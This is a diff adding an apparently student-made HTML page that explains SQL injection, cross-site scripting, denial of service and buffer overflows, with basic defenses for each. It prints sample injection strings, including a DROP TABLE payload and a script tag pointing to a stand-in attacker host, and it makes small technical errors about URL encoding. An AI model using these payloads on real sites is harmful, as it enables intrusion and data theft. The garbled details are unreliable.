@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    
+    <title>Cybersecurity</title>
+
+    <!-- here be the CSS sheet -->
+    <link href="Crypto CSS Sheet.css" rel="stylesheet" type="text/css">
+
+    <!-- Bootstrap -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+  </head>
+  <body>
+    
+    <!-- Here is the top header -->
+    <header>
+        <img src="photos\logo.png" class="img-rounded" style="width:40%">
+    </header>
+
+    <!-- TESTING: navbar test -->
+
+    <nav class="navbar navbar-inverse">
+        <div class="container-fluid">
+            <ul class="nav navbar-nav">
+                <li><a href="index.html">Home</a></li>
+                <li class="dropdown">
+
+                    <a class="dropdown-toggle" data-toggle="dropdown" href="#">Ciphers
+                    <span class="caret"></span></a>
+
+                    <ul class="dropdown-menu">
+                        <li><a href="atbash.html">Atbash Cipher</a></li>
+                        <li><a href="caesar.html">Caesar Cipher</a></li>
+                        <li><a href="substitution.html">Simple Substitution Cipher</a></li>
+                        <li><a href="vigenere.html">Vigenère Cipher</a></li>
+                        <li><a href="playfair.html">Playfair Cipher</a></li>
+                        <li><a href="ADFGVX.html">ADFGVX Cipher</a></li>
+                        <li><a href="onetimepad.html">The One Time Pad</a></li>
+                    </ul>
+                </li>
+                <li><a href="conversions.html">Conversions</a></li>
+                <li><a href="cybersecurity.html">Cybersecurity</a></li>
+                <li><a href="resources.html">Resources</a></li>
+                <li><a href="about.html">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- here be the main text -->
+    <section>
+        <h1>Cybersecurity Methods and Common Vulnerabilities</h1>
+        <hr>
+        
+        <div class="row">
+            <h2>SQL Injection</h2>
+            <h3>What Is It?</h3>
+            <p>An <b>SQL Injection</b> attack occurs when Structured Query Language (SQL, pronounced "sequel") code is put into an field for entry - say, a password textbox - that breaks the code and allows access to data the user otherwise could not access. SQL Injection attacks first began around 1998, and to this day remains one of the most common attacks on unprotected websites.</p>
+            <p>SQL Injection works mainly by exploiting specific quirks of programming languages and bad coding practices. Say, for instance, we have two textboxes - one for a username and one for a password. The code to find a user in a database looks like this:</p>
+            <pre>SELECT * FROM users WHERE user = '' AND pass = ''</pre>
+            <p>Suppose that a hacker wanted to take advantage of this system. In programming, there are certain characters called <b>escape characters</b>. In this case, the single quotation mark (') stands as the escape character. Other escape characters are regular quoatation marks ("), backslashes (\), and language-specific comment characters. These characters or groups of characters often act as deliniation points for certain pieces of data, such as strings and comments. In our case, the single-quotation mark deliniates where a string should be. A prospective hacker could take advantage of this quirk by adding another single quotation mark into the input for username.</p>
+            <pre>SELECT * FROM users WHERE user = ''<i>' AND pass = ''</i><br>The program now doesn't know what to do with the extra text beyond user = ''. To it, that text is wholly unrelated. So the program just crashes.</pre>
+            <p>So the hacker just crashed the site - so what? From here, the hacker now has free reign to add whatever they want after that extra single-quotation mark. A common thing to see inputted is <b>' OR 1=1 --</b>. Let's break that down. The single quotation mark is there as an escape from the original single-quotation. The OR is a boolean statement. It essnentially divides the statement into two, telling the program to grant access if user = some OR 1=1. The 1=1 is a guarenteed true statement. In programming, the boolean OR statement only requires one of its sides to be true for the statement to return true. The two dashes are a common comment statement in SQL, and so we comment out any code following our injected statement to ensure the program does not crash. So by inserting this statement, the program thinks that we do have a legal username and password, and lets us in.</p>
+            <pre>SELECT * FROM users WHERE user = '<b>' OR 1=1 --</b><i>AND pass = ''</i></pre>
+            <p>Vulnerable websites can have SQL injection attacks have someone go from impersonating users, stealing password, or at worst, deleting entire databases (shown below).</p>
+            <pre>SELECT * FROM users WHERE user = '<b>'; DROP TABLE users;</b><i>AND pass = ''</i></pre>
+            <p>Other than changing out comment characters for a specific language, the process behind an SQL injection remains rather uniform for all platforms and sites.</p>
+            <h3>How Can We Protect Against It?</h3>
+            <p>One of the simplest ways of preventing SQL Injection is by "sanitizing" or "preparing" your inputs. If your input prevents people from inputting escape characters at all, then it helps to cut down on what could have been a disasterous attack on our database.</p>
+            <hr>
+            <h2>Cross Site Scripting (XSS)</h2>
+            <h3>What Is It?</h3>
+            <p><b>Cross Site Scripting</b>, or XSS, occurs when a hacker takes advantage with vulnerabilities in HTML and web-development languages, such as JavaScript and PHP. In HTML, the central item of use are tags. These tags look like &ltthis&gt, and can deliniate how text on the screen looks.<b>&ltb&gt&lt/b&gt</b> tags make the text bold, <i>&lti&gt&lt/i&gt</i> italicizes the text, etc. One special tag, &ltscript&gt&lt/script&gt, allows developers to input JavaScript code that runs on a website.</p>
+            <p>The vulnerability comes, once again, with user inputs. If an input is not properly protected, a user could input HTML tags and have them affect the entire page. Say, for instance, the user inputed an &lti&gt into their input. If not properly protected, the rest of the website would be italicized. Now say someone inputted &ltscript&gt&lt/script&gt. This means that anything that comes afterwards, the computer will recognize as actual code that it now has to run. This is highly dangerous.</p>
+            <p>There are two types of XSS attacks: <b>persistent</b> and <b>non-persistent</b>. Persistent attacks are ones that theoretically run all the time - persistently. As long as anyone accesses that webpage, the XSS attack is occuring. Say, for instance, I can input a comment into someone's blog. A malicious post could look a bit like this:</p>
+            <pre>Take a look at this interesting article!<b>&ltscript&gtsteal_data()&lt/script&gt</b></pre>
+            <p>That means whenever someone accesses this webpage, their browser comes up to my comment, and then decides to run the function steal_data(). This is what makes persistent attacks the most dangerous XSS attack. While in reality, it's far more complicated than that, the general process is the same.</p>
+            <p>Non-persistent attacks often require the victim to play some role in being attacked, usually by clicking on a link. These attacks are non-persistent since they can only run once the user has done something to cause the attack. Say we have a website where users can search for items, and that item is searched for in the database and shown in the URL as "http://examplesite.com?q=article". A hacker could then use this vulnerability, searching for <b>article&ltscript%20src=evildatastealingsite.net&gt&lt/script&gt</b>. (The %20 is the special encoded designation for the > character in URLs. The hacker uses this so that the script doesn't run on their own device.)</p>
+            <pre><b>Search Term</b>: article&ltscript%20src=evildatastealingsite.net&gt&lt/script&gt<br><b>Returned URL</b>: http://examplesite.com?q=article&ltscript%20src=evildatastealingsite.net&gt&lt/script&gt</pre>
+            <p>The hacker then sends this link to unsuspecting victims, perhaps using more URL encoded characters to avoid detection.</p>
+            <pre>Hey there, here's an article that can help you learn how to win the lottery: http://examplesite.com?q=article&ltscript%20src=evildatastealingsite.net&gt&lt/script&gt</pre>
+            <p>Once the user clicks on that link, the computer runs whatever script is on evildatastealingsite.net and then returns that data to the hacker, with the victim not being able to tell, as the URL also takes them to whatever article is linked.</p>
+            <h3>How Can We Protect Against It?</h3>
+            <p>Once again, input sanitation is the biggest help here. By removing or protecting against certain input phrases, XSS attacks are diminished. Other preventative measures may include using escape characters against tags, using special HTML sanitizing schemes, or preventing the use of client-based scripts altogether.</p>
+            <hr>
+            <h2>DoS Attacks</h2>
+            <h3>What Is It?</h3>
+            <p><b>Denial of Service</b> (DoS) attacks consist primarily of a computer or multiple computers essentially overloading a victim computer with too many superfluous requests that blocks out any other request from being responded to. Think of data as people, and the connection to the internet as a hallway. In regular traffic, hallway traffic is relatively smooth: people can walk through with ease. In a DoS attack, imagine a flood of people trying to enter the hallway all at once - suddenly less people who need to go through can't enter, as they are blocked by others, and people can't leave the hallway easily. This slows down the entire system to a halt. There are three categories of DoS attack:</p>
+            <ul>
+                <li><b>Standard Denial of Service (DoS)</b>: These attacks consist of a one-on-one fight between computers. A computer capable of sending a lot of data sends a flood of data to a much "weaker" computer, overwhelming it and preventing any other data from accessing it. In early days, this could be accomplished by sending a university network's data against someone's personal home connection. These attacks aren't common now, since both DoS attacks only affect one connection that could easily be blocked or severed, but also because broadband connections have gotten to a point where they can now pass through more data - the hallway has widened over time.</li>
+                <li><b>Distributed Denial of Service (DDoS)</b>: This is the more common DoS attack. DDoS attacks consist of multiple computers attacking one central computer or server. A hacker could easily spread around a script that forces other computers to send data to the victim computer, essentially making them "zombie computers". This means, unlike DoS attacks, the attack cannot be stopped by severing one connection - the attack is coming from multiple sources. With enough computers, enough data could be sent to cripple any connection - whether it be a personal connection or the central server to a web service or website. Over time, the size and scale of DDoS attacks has increased greatly, around one terabit per second in recent years. Attacks of this scale can take down internet for major sites, such as <a href="https://www.theguardian.com/technology/2016/oct/26/ddos-attack-dyn-mirai-botnet">one in 2016 that brought down numerous sites for the entire United States</a>.</li>
+                <li><b>Advanced DDoS:</b> Advanced DDoS attacks often require a lot more technical expertise than the other two. Advanced DDoS attacks often take advantage of certain vulnerabilities in computer systems - in one case, a user could request an incredibly large packet of data from a central server with one command. A hacker could "spoof" the return address for this large packet of data, and instead tell the central server to send that data to another user. Zombie computers that also access this server can intensify the attack. These attacks can come at such a scale that they not only break down the victim's connection, but they threaten the entire Internet with the levels of data they send. Many theoretical attacks in this manner have been proposed by researchers.</li>
+            </ul>
+            <h3>How Can We Protect Against It?</h3>
+            <p>Luckily, due to the commonality of DoS attacks, numerous programs have been written to analyze data inputs to make sure that they are not malicious. Other methods of protection including blocking connections using firewalls and limiting how much data can enter at a time (rate-limiting).</p>
+            <hr>
+            <h2>Buffer Overflows</h2>
+            <h3>What Is It?</h3>
+            <p><b>Buffer Overflows</b> take advantage of how data is stored in the memory of computer systems, often by going beyond what is allocated.</p>
+            <p>These attacks occur when the data inputted goes over the allocated space in the memory for that data, thus "overflowing". Any data that overflows can go on to affect other memory spaces, and affect other data. Take for instance, a bank that stores two variables: One is an ID number and one is the amount of money in a bank account. The ID number is always 8 digits, and the bank account is 4 digits. Both begin empty.</p>
+            <pre><b>ID Number Space</b>     <i>Bank Account Space</i><br><b>0 0 0 0 0 0 0 0</b>     <i>0 0 0 0</i></pre>
+            <p>Now say that we create a new user, with ID # 12345678 and $1542 in the bank.</p>
+            <pre><b>ID Number Space</b>     <i>Bank Account Space</i><br><b>1 2 3 4 5 6 7 8</b>     <i>1 5 4 2</i></pre>
+            <p>Assuming that this bank hasn't protected against buffer overflows, let's see what happens when we input <b>123456780000</b> as an ID number.</p>
+            <pre><b>ID Number Space</b>     <i>Bank Account Space</i><br><b>1 2 3 4 5 6 7 8</b>     <i><b>0 0 0 0</b></i></pre>
+            <p>Oh dear. The four zeroes of the ID number overflowed the allocated memory space for the bank ID and affected the amount of money in the bank. Now this was an incredibly simplified example, but the gist of it remains the same.</p>
+            <h3>How Can We Protect Against It?</h3>
+            <p>Whether a program is subject to a buffer overflow attack may rely heavily on how it was written. For instance, programs written in C or C++ are actually more susceptible to buffer overflow attacks than languages like Python and Java, due to how their languages deal with memory buffers. The main difference is that C/C++ doesn't explicitly check whether what is being inputted for a memory space actually matches the length of the space allowed. Otherwise, use of memory safety programs and rigorous testing can help prevent a buffer overflow from affecting one's program or site.</p>
+            <hr>   
+        </div>
+
+    </section>
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" download></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="js/bootstrap.min.js"></script>
+  </body>
+</html>
